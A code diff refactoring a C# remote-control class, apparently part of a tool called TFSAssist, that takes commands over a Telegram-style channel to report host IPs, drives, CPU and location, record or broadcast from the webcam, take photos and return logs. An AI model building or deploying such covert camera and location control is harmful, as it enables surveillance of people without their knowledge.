@@ -40,9 +40,10 @@ namespace TFSAssist.Remoter
         private string _locationResult = string.Empty;
         private bool _tryGetLocation = false;
 
-        private readonly Action _checkUpdates;
-        private readonly Action _restartApplication;
-        private readonly Func<string> _getLogs;
+        //private readonly Action _checkUpdates;
+        //private readonly Action _restartApplication;
+        //private readonly Func<string> _getLogs;
+        private readonly Func<string, string> _callParent;
 
         private string _tempDir = string.Empty;
 
@@ -68,15 +69,17 @@ namespace TFSAssist.Remoter
 
         private Dictionary<string, RemoteControlCommands> AllCommands { get; } = new Dictionary<string, RemoteControlCommands>(StringComparer.CurrentCultureIgnoreCase);
 
-        public RemoteControl(Thread mainThread, string clientId, Action checkUpdates, Action restartApplication, Func<string> getLogs)
+        public RemoteControl(Thread mainThread, string clientId, Func<string, string> callParentFunctions)
         {
             MainThread = mainThread;
-            _processingErrorLogs = new StringBuilder();
-            _checkUpdates = checkUpdates;
-            _restartApplication = restartApplication;
-            _getLogs = getLogs;
             ClientID = clientId;
+
+            _processingErrorLogs = new StringBuilder();
+            _callParent = callParentFunctions;
+
+            
             TempDirectory = Path.Combine(ASSEMBLY.ApplicationDirectory, "Temp");
+
             foreach (RemoteControlCommands command in Enum.GetValues(typeof(RemoteControlCommands)))
             {
                 AllCommands.Add(command.ToString("G"), command);
@@ -329,6 +332,7 @@ namespace TFSAssist.Remoter
         async Task ReadCommands(List<TLMessage> newMessages, string projectDirPath)
         {
             bool isUpdate = false;
+            bool isRestart = false;
             string isCommand = ClientID + ":";
 
             try
@@ -355,17 +359,14 @@ namespace TFSAssist.Remoter
                         switch (command)
                         {
                             case RemoteControlCommands.PING:
-
                                 SendMessageToUserHost("PONG. " + GetCurrentServerInfo());
                                 break;
 
                             case RemoteControlCommands.COMMANDS:
-
                                 SendMessageToUserHost(string.Join("\r\n", Enum.GetNames(typeof(RemoteControlCommands))));
                                 break;
 
                             case RemoteControlCommands.INFO:
-
                                 StringBuilder detInfo = new StringBuilder();
 
                                 var hostIps = HOST.GetIPAddresses();
@@ -394,13 +395,14 @@ namespace TFSAssist.Remoter
                                         detInfo.Append($"{value.Key} {new string('.', maxLenghtSpace - value.Key.Length)} [{string.Join("];[", value.Value)}]\r\n");
                                     }
 
-                                    Dictionary<string, FileBuildInfo> localVersions = BuildPackInfo.GetLocalVersions(Assembly.GetExecutingAssembly());
+                                    // должен быть именно GetEntryAssembly вместо GetExecutingAssembly. Т.к. GetExecutingAssembly смотрит исполняемую библиотеку, а не испольняемый exe файл
+                                    Dictionary<string, FileBuildInfo> localVersions = BuildPackInfo.GetLocalVersions(Assembly.GetEntryAssembly());
                                     if (localVersions?.Count > 0)
                                     {
                                         maxLenghtSpace = localVersions.Keys.Aggregate("", (max, cur) => max.Length > cur.Length ? max : cur).Length + 3;
                                         localVersions = localVersions.OrderBy(p => p.Key).ToDictionary(x => x.Key, x => x.Value);
 
-                                        detInfo.Append($"\r\nLocation=[{Assembly.GetExecutingAssembly().GetDirectory()}]\r\n");
+                                        detInfo.Append($"\r\nLocation=[{Assembly.GetEntryAssembly().GetDirectory()}]\r\n");
                                         foreach (var versionLocalFiles in localVersions)
                                         {
                                             detInfo.Append($"{versionLocalFiles.Key} {new string('.', maxLenghtSpace - versionLocalFiles.Key.Length)} [{versionLocalFiles.Value.Version}]\r\n");
@@ -411,26 +413,7 @@ namespace TFSAssist.Remoter
                                 }
                                 break;
 
-                            case RemoteControlCommands.LOG:
-
-                                string logs = GetProcessingLogs();
-                                if (logs.IsNullOrEmptyTrim())
-                                {
-                                    SendMessageToUserHost("Log is empty.");
-                                    break;
-                                }
-                                else if (logs.Length <= 800) // если логов немного
-                                {
-                                    SendMessageToUserHost(logs);
-                                    break;
-                                }
-
-                                await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), logs);
-
-                                break;
-
                             case RemoteControlCommands.DRIVE:
-
                                 var drives = DriveInfo.GetDrives();
                                 if (drives == null || drives.Length == 0)
                                     break;
@@ -440,7 +423,7 @@ namespace TFSAssist.Remoter
                                 {
                                     if (drive.IsReady)
                                     {
-                                        result += $"Drive=[{drive.Name}] FreeSize=[{IO.FormatBytes(drive.TotalFreeSpace, out _)}]\r\n";
+                                        result += $"Drive=[{drive.Name}] TotalSize=[{IO.FormatBytes(drive.TotalSize, out _)}] FreeSize=[{IO.FormatBytes(drive.TotalFreeSpace, out _)}]\r\n";
                                     }
                                 }
 
@@ -454,7 +437,6 @@ namespace TFSAssist.Remoter
                                 break;
 
                             case RemoteControlCommands.CPU:
-
                                 Process proc = Process.GetCurrentProcess();
 
                                 var totalCPU = (int)SERVER.GetCpuUsage();
@@ -468,18 +450,7 @@ namespace TFSAssist.Remoter
 
                                 break;
 
-                            case RemoteControlCommands.RESTART:
-
-                                _restartApplication?.Invoke();
-                                break;
-
-                            case RemoteControlCommands.UPDATE:
-
-                                isUpdate = true;
-                                break;
-
                             case RemoteControlCommands.LOC:
-
                                 if (_locationResult.IsNullOrEmptyTrim())
                                 {
                                     SendMessageToUserHost("Location unknown.");
@@ -493,7 +464,6 @@ namespace TFSAssist.Remoter
                                 break;
 
                             case RemoteControlCommands.CAMINFO:
-
                                 string currentDevices = string.Empty;
                                 string resultCamInfo = string.Empty;
                                 if (_aforgeDevices != null)
@@ -519,7 +489,6 @@ namespace TFSAssist.Remoter
                                 break;
 
                             case RemoteControlCommands.CAMSETT:
-
                                 int exceptionCount = 0;
                                 if (options != null && options.Count > 0)
                                 {
@@ -577,19 +546,14 @@ namespace TFSAssist.Remoter
                                 break;
 
                             case RemoteControlCommands.ACAM:
-
                                 _aforgeCapture?.StartCamRecording();
-
                                 break;
 
                             case RemoteControlCommands.ECAM:
-
                                 _encoderCapture?.StartCamRecording();
-
                                 break;
 
                             case RemoteControlCommands.BROADCAST:
-
                                 if (_encoderCapture == null)
                                     break;
 
@@ -606,23 +570,16 @@ namespace TFSAssist.Remoter
                                 }
 
                                 _encoderCapture.StartBroadcast();
-
                                 break;
 
                             case RemoteControlCommands.STOPCAM:
-
                                 _aforgeCapture?.Stop();
-
                                 _encoderCapture?.Stop();
-
                                 break;
-                            case RemoteControlCommands.PHOTO:
 
+                            case RemoteControlCommands.PHOTO:
                                 if (_aforgeCapture == null)
-                                {
-                                    SendMessageToUserHost($"{nameof(AForgeCapture)} not initialized.");
                                     break;
-                                }
 
                                 Task<Bitmap> task = _aforgeCapture.GetPictureAsync();
                                 if (task.Wait(20000))
@@ -634,13 +591,56 @@ namespace TFSAssist.Remoter
                                         photo.Save(photoPath, ImageFormat.Png);
                                     }
                                 }
-
                                 break;
 
-                            case RemoteControlCommands.KILL:
+                            //case RemoteControlCommands.KILL:
+                            //    Terminate();
+                            //    break;
 
-                                Terminate();
+                            case RemoteControlCommands.LOG:
+                                string entireLogs = _callParent?.Invoke(RemoteControlCommands.LOG.ToString("G"));
+                                string currentLogs = GetCurrentProcessingLogs();
 
+                                if (entireLogs.IsNullOrEmpty())
+                                {
+                                    entireLogs = currentLogs;
+                                }
+                                else if (!currentLogs.IsNullOrEmpty())
+                                {
+                                    entireLogs = $"{entireLogs}\r\n\r\n{new string('=', 15)}\r\n\r\n{currentLogs}";
+                                }
+
+                                if (entireLogs.IsNullOrEmptyTrim())
+                                {
+                                    SendMessageToUserHost("Log is empty.");
+                                    break;
+                                }
+                                else if (entireLogs.Length <= 800) // если логов немного
+                                {
+                                    SendMessageToUserHost(entireLogs);
+                                    break;
+                                }
+
+                                await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), entireLogs);
+                                break;
+
+                            case RemoteControlCommands.UPDATE:
+                                isUpdate = true;
+                                break;
+
+                            case RemoteControlCommands.RESTART:
+                                isRestart = true;
+                                break;
+
+                            default:
+                                string parentResult = _callParent?.Invoke(command.ToString("G"));
+                                if (!parentResult.IsNullOrEmptyTrim())
+                                {
+                                    if(parentResult.Length <= 800)
+                                        SendMessageToUserHost(parentResult);
+                                    else
+                                        await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), parentResult);
+                                }
                                 break;
                         }
                     }
@@ -654,11 +654,13 @@ namespace TFSAssist.Remoter
                             case RemoteControlCommands.PING:
                                 SendMessageToUserHost("PONG. " + GetCurrentServerInfo());
                                 break;
+                            
                             case RemoteControlCommands.UPDATE:
                                 isUpdate = true;
                                 break;
-                            case RemoteControlCommands.KILL:
-                                Terminate();
+
+                            case RemoteControlCommands.RESTART:
+                                isRestart = true;
                                 break;
                         }
                     }
@@ -672,9 +674,21 @@ namespace TFSAssist.Remoter
             {
                 SendPreparedFiles(projectDirPath);
 
-                if (isUpdate)
+                // выполняется всегда в конце после обработки других комманд, если они были
+                try
                 {
-                    _checkUpdates?.BeginInvoke(null, null);
+                    if (isUpdate)
+                    {
+                        _callParent?.Invoke(RemoteControlCommands.UPDATE.ToString("G"));
+                    }
+                    else if (isRestart)
+                    {
+                        _callParent?.Invoke(RemoteControlCommands.RESTART.ToString("G"));
+                    }
+                }
+                catch (Exception ex)
+                {
+                    WriteExLog(ex);
                 }
             }
         }
@@ -1064,13 +1078,13 @@ namespace TFSAssist.Remoter
                 _processingErrorLogs.Append($"[{isDebugStr}]:[{DateTime.Now:G}]={message}\r\n");
         }
 
-        string GetProcessingLogs()
+        string GetCurrentProcessingLogs()
         {
-            string pullLogs = _getLogs?.Invoke();
-            pullLogs = pullLogs ?? string.Empty;
+            string pullLogs;
+
             lock (syncLog)
             {
-                pullLogs += _processingErrorLogs.ToString().Trim();
+                pullLogs = _processingErrorLogs.ToString().Trim();
                 _processingErrorLogs.Clear();
             }
 
